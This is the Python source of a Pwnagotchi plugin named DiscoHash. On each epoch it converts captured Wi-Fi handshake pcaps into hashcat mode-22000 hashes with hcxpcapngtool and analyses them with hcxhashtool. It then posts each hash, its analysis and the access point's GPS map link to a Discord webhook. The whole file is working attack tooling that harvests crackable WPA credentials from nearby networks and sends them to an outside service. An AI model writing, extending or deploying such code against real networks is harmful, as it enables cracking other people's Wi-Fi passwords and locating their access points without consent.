import os
import json
import logging
import requests
import subprocess
import pwnagotchi
import pwnagotchi.plugins as plugins


class discohash(plugins.Plugin):
    __author__ = 'v0yager'
    __version__ = '1.0.0'
    __license__ = 'GPL3'
    __description__ = '''
                    DiscoHash extracts hashes from pcaps (hashcat mode 22000) using hcxpcapngtool,
                    analyses the hash using hcxhashtool and posts the output to Discord.
                    '''

    def __init__(self):
        logging.debug("[*] DiscoHash plugin created")
    

    # called when the plugin is loaded
    def on_loaded(self):
        logging.info(f"[*] DiscoHash plugin loaded")
    

    # called when an epoch is over (where an epoch is a single loop of the main algorithm)
    def on_epoch(self, agent, epoch, epoch_data):
        global fingerprint
        fingerprint = agent.fingerprint()
        handshake_dir = "/root/handshakes/"
        self.process_pcaps(handshake_dir)


    def process_pcaps(self, handshake_dir):
        handshakes_list = [os.path.join(handshake_dir, filename) for filename in os.listdir(handshake_dir) if filename.endswith('.pcap')]
        failed_jobs = []
        successful_jobs = []
        lonely_pcaps = []
        for num, handshake in enumerate(handshakes_list):
            fullpathNoExt = handshake.split('.')[0]
            pcapFileName = handshake.split('/')[-1:][0]
            if not os.path.isfile(fullpathNoExt + '.22000'):
                if self.write_hash(handshake):
                    successful_jobs.append('22000: ' + pcapFileName)
                else:
                    failed_jobs.append('22000: ' + pcapFileName)
                    if not os.path.isfile(fullpathNoExt + '.22000'): 
                        lonely_pcaps.append(handshake)
                        logging.debug('[*] DiscoHash Batch job: added {} to lonely list'.format(pcapFileName))
            if ((num + 1) % 10 == 0) or (num + 1 == len(handshakes_list)):
                logging.debug('[*] DiscoHash Batch job: {}/{} done ({} fails)'.format(num + 1,len(handshakes_list),len(lonely_pcaps)))
        if successful_jobs:
            logging.debug('[*] DiscoHash Batch job: {} new handshake files created'.format(len(successful_jobs)))
        if lonely_pcaps:
            logging.debug('[*] DiscoHash Batch job: {} networks without enough packets to create a hash'.format(len(lonely_pcaps)))
    

    def write_hash(self, handshake):
        fullpathNoExt = handshake.split('.')[0]
        filename = handshake.split('/')[-1:][0].split('.')[0]
        result = subprocess.getoutput('hcxpcapngtool -o {}.22000 {} >/dev/null 2>&1'.format(fullpathNoExt,handshake))
        if os.path.isfile(fullpathNoExt +  '.22000'):
            logging.info('[+] DiscoHash EAPOL/PMKID Success: {}.22000 created'.format(filename))
            self.get_coord(fullpathNoExt)
            self.post_hash(fullpathNoExt)
            return True
        else:
            return False
    

    def get_coord(self, fullpathNoExt):
        global loc_earth
        global loc_marker
        try:
            read_gps = open(f'{fullpathNoExt}.gps.json', 'r')
            gps_bytes = read_gps.read()
            raw_gps = json.loads(gps_bytes)
            lat = json.dumps(raw_gps['Latitude'])
            lon = json.dumps(raw_gps['Longitude'])
            loc_earth = "https://earth.google.com/web/@{},{},14.94624199a,500d,35y,0h,0t,0r".format(lat, lon)
            loc_marker = "https://www.google.com/maps/search/?api=1&query={},{}".format(lat, lon)
        except Exception as e:
            loc_earth = "(☓‿‿☓) : No GPS data available for this AP"
            loc_marker = "(☓‿‿☓) : No GPS data available for this AP!"


    def post_hash(self, fullpathNoExt):
        try:
            hash_val = open(f'{fullpathNoExt}.22000', 'r')
            hash_data = hash_val.read()
            analysis = subprocess.getoutput('hcxhashtool -i {}.22000 --info=stdout'.format(fullpathNoExt))
        except Exception as e:
            logging.warning('[!] DiscoHash: An error occured {}'.format(e))
        try:
            data = {
                'embeds': [
                    {
                    'title': '(ᵔ◡◡ᵔ) {} sniffed a new hash!'.format(pwnagotchi.name()), 
                    'color': 3553599,
                    'url': 'https://pwnagotchi.ai/pwnfile/#!{}'.format(fingerprint),
                    'description': '__**Hash Information**__',
                    'fields': [
                        {
                            'name': 'Hash:',
                            'value': '`{}`'.format(hash_data),
                            'inline': False
                        },
                        {
                            'name': 'Hash Analysis:',
                            'value': '```{}```'.format(analysis),
                            'inline': False
                        },
                        {
                            'name': 'GPS Location:',
                            'value': '{}'.format(loc_marker),
                            'inline': False
                        },
                    ],
                    'footer': {
                        'text': 'Pwnagotchi v1.5.5 - DiscoHash Plugin v{} \
                        \nAuthors PwnMail: 53291d7013a14b08cd8c7fea3b5de0f60f5e391f5584ac8310af5cfd96a04a4a'.format(self.__version__)
                    }
                    }
                ]
            }
            requests.post(self.options['webhook_url'], files={'payload_json': (None, json.dumps(data))})
            logging.debug('[*] DiscoHash: Webhook sent!')
        except Exception as e:
            logging.warning('[!] DiscoHash: An error occured with the plugin!{}'.format(e))
